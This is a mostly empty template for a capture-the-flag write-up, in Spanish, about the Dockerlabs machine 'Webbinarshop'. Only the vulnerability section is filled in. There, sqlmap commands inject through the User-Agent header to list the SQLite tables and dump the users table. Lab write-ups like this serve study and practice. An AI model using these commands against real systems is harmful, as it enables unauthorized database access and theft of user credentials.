---
title: Dockerlabs- Webbinarshop
date: 2026-10-22
platform: Dockerlabs
difficulty: Easy
os: Linux
tags:
  - 
status: ""
---

# Resumen Ejecutivo
**IP Objetivo:** ``
**Descripción breve:** 

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos
```bash

```

**Puertos Abiertos:**
- 80

### Enumeración de Servicios / Fuzzing
```bash

```

**Descubrimientos clave:**
- 

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- Nos creamos una cuenta, y al revisar la peticion con burp suite en el apartado de la cuenta, nos damos cuenta que tiene una cabecera HTTP User-Agent, esto por lo general se usa para guardar datos del navegador en una db de la pagina
- Por ello tal vez no este bien protegida y podemos usar SQLmap para poder atacar la cabecera

```bash
sqlmap -r peticion.txt --dbs -p "User-Agent" --batch
```

- nos confirma que es un sqlite, ejecutamos esto

```bash
sqlmap -r peticion.txt --dbs -p "User-Agent" --batch --dbms=sqlite --tables
```
- eso nos da las tablas de la base de datos, pero quiero obtener los registros de la tabla users

```bash
sqlmap -r peticion.txt --dbs -p "User-Agent" --batch --dbms=sqlite -T users --dump
```

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. 
2. 
3. 

### Ejecución
```bash

```

**Prueba de acceso (User Flag):**
```bash

```

---

## 4. Privilege Escalation (Escalada de Privilegios)

### Enumeración Interna
- 

### Explotación Local
1. 
2. 
3. 

### Ejecución
```bash

```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash

```

---

## 5. Post-Exploitation & Clean Up
- [ ] 
- [ ] 
- [ ] 

---

## Remediation (Mitigaciones)
- **Acceso inicial:** 
- **Escalada:**